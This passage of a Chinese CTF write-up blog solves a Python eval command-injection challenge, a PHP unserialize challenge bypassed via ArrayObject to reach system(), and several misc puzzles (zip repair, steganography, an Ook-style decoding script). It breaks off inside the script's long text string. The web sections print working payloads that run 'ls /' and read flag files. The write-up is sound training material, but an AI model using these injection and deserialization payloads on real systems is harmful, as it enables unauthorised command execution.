+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;ls /&quot;</span>).read()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040037458.png" srcset="/img/loading.gif" lazyload alt="image-20230404003724365"></p>
+<p>然后查看flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat /flag_is_h3re&quot;</span>).read()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1+1&gt;2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>分析一下代码，首先，我们需要知道，怎么进行get传参：<code>$_GET[&#39;1+1&gt;2&#39;]</code></p>
+<p>我们做一个小实验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>echo print_r($_GET);<br></code></pre></td></tr></table></figure>
+
+<p>如果我们直接传参：<code>1+1&gt;2</code></p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041430509.png" srcset="/img/loading.gif" lazyload alt="image-20230404143039437" style="zoom:33%;" />
+
+<p>可以发现，<code>+加号</code>被替换为了<code>下滑线_</code>，但是我们将加号替换为url编码：<code>%2B</code></p>
+<p>发现就可以了：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041432688.png" srcset="/img/loading.gif" lazyload alt="image-20230404143238634" style="zoom:33%;" />
+
+<p>我们观察一下这个正则：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果序列化后的串是以O或者A开头，即对象或数组的话，就不行。</p>
+<p>本来想的是使用数值前弄一个加号绕过的，但是反序列化的时候没用</p>
+<p>看了wp后，发现使用了一个内置类：<code>ArrayObject</code></p>
+<p>我们可以将对象传入<code>ArrayObject</code>对象的构造方法中，然后序列化一下，进行绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$c</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">输出：<br>C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">58</span>:&#123;x:i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>传参：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041446078.png" srcset="/img/loading.gif" lazyload alt="image-20230404144648994"></p>
+<p>（注意看，这里还是使用了<code>__wakeup()</code>，但是程序并没有结束，可能是有某些错误造成程序还在执行）</p>
+<p>然后得flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">67</span>:&#123;x:i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;cat /f1agaaa&quot;</span>;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h4><p>下载后得到zip压缩包，我们把两处改为00即可</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040042504.png" srcset="/img/loading.gif" lazyload alt="image-20230404004242381" style="zoom: 33%;" />
+
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040043253.png" srcset="/img/loading.gif" lazyload alt="image-20230404004328215" style="zoom:50%;" />
+
+<p>然后在png图片结尾发现一串key：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040044863.png" srcset="/img/loading.gif" lazyload alt="image-20230404004429821" style="zoom:50%;" />
+
+<p>解压后得到：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yurenjie</span><br></code></pre></td></tr></table></figure>
+
+<p>我们在图片中发现zip文件：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040047362.png" srcset="/img/loading.gif" lazyload alt="image-20230404004703316" style="zoom:33%;" />
+
+<p>使用foremost分离一下，得到zip，解密密码：<code>yurenjie</code></p>
+<p>得到一张crc不匹配的图片，改一下高度即可</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040048484.png" srcset="/img/loading.gif" lazyload alt="image-20230404004840396" style="zoom:33%;" />
+
+
+
+<h4 id="哇库哇库2"><a href="#哇库哇库2" class="headerlink" title="哇库哇库2"></a>哇库哇库2</h4><p>下载后得到压缩包，密码如下：</p>
+<blockquote>
+<p>阿尼亚会高数: 哇库哇库！</p>
+<ol>
+<li>key &#x3D; Σ(1&#x2F;(n!))</li>
+<li>“Σ(1&#x2F;(n!))”为无穷级数</li>
+<li>结果四舍五入保留十二位有效数字</li>
+</ol>
+</blockquote>
+<p>我们写个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 密码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">num</span>):<br>    a = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        a = a * x<br>    <span class="hljs-keyword">return</span> a<br><br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    m = <span class="hljs-number">1</span> / main(i)<br>    total = total + m<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%.11f&quot;</span> % (total+<span class="hljs-number">1</span>))<br>    <br>密码：<span class="hljs-number">2.71828182846</span><br></code></pre></td></tr></table></figure>
+
+<p>然后打开docx文件：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041104645.png" srcset="/img/loading.gif" lazyload alt="image-20230404110449487"></p>
+<p>对比原字幕，发现多了标点符号：<code>。？！</code>，有点像<code>简化版的Ook编码</code>(只有<code>!.?</code>)</p>
+<p>我们将 <code>。？！</code>替换为英文的<code>.?!</code></p>
+<p>然后替换掉换行符，变成一行字符串，如果字符是：<code>.?!</code>，直接输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Start!&#x27;</span>)<br><br><span class="hljs-comment"># f=open(&#x27;flag.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;UTF-8&#x27;)</span><br><br><span class="hljs-comment"># string = f.read()</span><br><br>string = <span class="hljs-string">&#x27;阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.好帅好帅!阿尼亚棒吗?可爱,可爱!阿尼亚不想去上学了!阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?交给我吧!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.阿尼亚好兴奋!阿尼亚可爱吗?阿尼亚要加油!阿尼亚在学校也会加油的!好想有个母亲爱我.阿尼亚帅不帅?阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.哇酷哇酷?阿尼亚必须加油!我想永远和他们在一起.阿尼亚棒吗?父亲做菜很好吃.多亏了父亲.营救公主的间谍!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.是住在城堡里的奇美拉!阿尼亚帅不帅?救命呀!救救我！劳埃德曼!好想有个母亲爱我.蓬蓬头?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!哇酷哇酷?阿尼亚喜欢厉害又帅气的母亲.阿尼亚棒吗?太好了!都怪阿尼亚踩到了粑粑.阿尼亚可爱吗?花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚一点也不在意.阿尼亚帅不帅?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚在学校也会加油的!蓬蓬头?阿尼亚必须加油!营救公主的间谍!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚可爱吗?是住在城堡里的奇美拉!阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚帅不帅?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.救命呀!父亲和母亲甜甜蜜蜜.蓬蓬头?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.救救我！劳埃德曼!哇酷哇酷?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!要是不向次子道歉,世界和平就完蛋了.阿尼亚棒吗?看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚可爱吗?欢迎来到阿尼亚家.阿尼亚帅不帅?阿尼亚想吃蛋包饭!阿尼亚想穿这身衣服出萌.蓬蓬头?警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.交给我吧!多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.父亲,阿尼亚合格啦!会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚好兴奋!阿尼亚想穿这身衣服出萌.哇酷哇酷?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.阿尼亚要加油!阿尼亚棒吗?阿尼亚在学校也会加油的!阿尼亚必须加油!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?可爱,可爱!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.父亲,母亲,有需要帮助的人!阿尼亚可爱吗?要帮助他!太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.蓬蓬头?母亲是杀手.哇酷哇酷?花生!父亲和母亲甜甜蜜蜜.阿尼亚棒吗?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.阿尼亚想吃蛋包饭!父亲是间谍.警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!母亲是杀手.阿尼亚可爱吗?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.营救公主的间谍!阿尼亚帅不帅?是住在城堡里的奇美拉!救命呀!欢迎来到阿尼亚家.蓬蓬头?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.哇酷哇酷?阿尼亚不想要这个妈妈.阿尼亚棒吗?救救我！劳埃德曼!父亲是间谍.阿尼亚可爱吗?阿尼亚好想看呀!母亲是杀手.阿尼亚帅不帅?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.完美的劳埃德曼,好想看呀!蓬蓬头?看我必杀拳,砰!好耶!欢迎来到阿尼亚家.哇酷哇酷?父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚棒吗?阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?可爱,可爱!阿尼亚想去你家玩.阿尼亚帅不帅?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!阿尼亚从孤儿院出来以后,遇到了好多开心的事.太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!阿尼亚好失落.蓬蓬头?好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.好帅好帅!哇酷哇酷?可爱,可爱!阿尼亚不想去上学了!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚棒吗?交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚可爱吗?我想永远和他们在一起.阿尼亚帅不帅?救命呀!父亲做菜很好吃.蓬蓬头?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!多亏了父亲.哇酷哇酷?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚想吃蛋包饭!阿尼亚棒吗?警惕!阿尼亚想像母亲一样厉害!阿尼亚喜欢厉害又帅气的母亲.阿尼亚可爱吗?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.阿尼亚帅不帅?我想永远和他们在一起.蓬蓬头?好帅好帅!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.可爱,可爱!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚不想去上学了!阿尼亚可爱吗?交给我吧!父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚帅不帅?阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!蓬蓬头?多亏了父亲.哇酷哇酷?救命呀!太好了.阿尼亚棒吗?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.看我必杀拳,砰!阿尼亚帅不帅?好耶!父亲,母亲,有需要帮助的人!阿尼亚喜欢厉害又帅气的母亲.蓬蓬头?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.哇酷哇酷?会没事的.阿尼亚棒吗?要帮助他!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚可爱吗?我想永远和他们在一起.父亲做菜很好吃.太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.花生!蓬蓬头?阿尼亚想吃蛋包饭!警惕!父亲是间谍.哇酷哇酷?阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚棒吗?母亲是杀手.阿尼亚可爱吗?救命呀!父亲和母亲甜甜蜜蜜.阿尼亚帅不帅?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了